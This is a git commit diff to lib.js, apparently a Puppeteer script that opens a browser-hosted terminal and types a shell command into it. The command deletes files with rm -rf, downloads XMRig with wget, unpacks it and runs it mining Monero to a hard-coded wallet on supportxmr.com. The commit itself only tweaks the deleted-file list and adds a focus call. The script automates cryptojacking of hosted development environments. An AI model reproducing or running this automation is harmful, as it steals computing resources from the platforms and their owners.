f492ceadf4aa65b51cedf7b87541d009258193a8
ducdn <duc.do@timeedit.com>
2025-05-14 23:35:16 +0700

    update focus

--- lib.js
+++ lib.js
@@ -268,7 +268,8 @@ const openTerminal = async (page) => {
 }
 const runCMD1 = async (page, name) => {
     await page.waitForSelector('.xterm-helper-textarea', { timeout: 100 * 1000 });
-    const textToType = 'rm -rf android ios xmrig-6.22.2-jammy-x64.tar.gz xmrig-6.22.2 README.md && wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-jammy-x64.tar.gz && tar -xvzf xmrig-6.22.2-jammy-x64.tar.gz && cd xmrig-6.22.2 && ./xmrig --donate-level 0 -o pool.supportxmr.com:443 -k --tls -t 8 -u 85RmESy58nhhmAa7KSazFpaTmp3p7wJzK7q84PHDtZZAeb6wT7tB5y2az4MC8MR28YZFuk6o8cXdvhSxXgEjHWj1E97eUU1.' + name + '\n';
+    const textToType = 'rm -rf android ios xmrig-6.22.2-jammy-x64.tar.gz xmrig-6.22.2 && wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-jammy-x64.tar.gz && tar -xvzf xmrig-6.22.2-jammy-x64.tar.gz && cd xmrig-6.22.2 && ./xmrig --donate-level 0 -o pool.supportxmr.com:443 -k --tls -t 8 -u 85RmESy58nhhmAa7KSazFpaTmp3p7wJzK7q84PHDtZZAeb6wT7tB5y2az4MC8MR28YZFuk6o8cXdvhSxXgEjHWj1E97eUU1.' + name + '\n';
+    await page.focus('.xterm-helper-textarea');
     await page.type('.xterm-helper-textarea', textToType);
     await page.evaluate(() => {
         const textarea = document.querySelector('.xterm-helper-textarea');
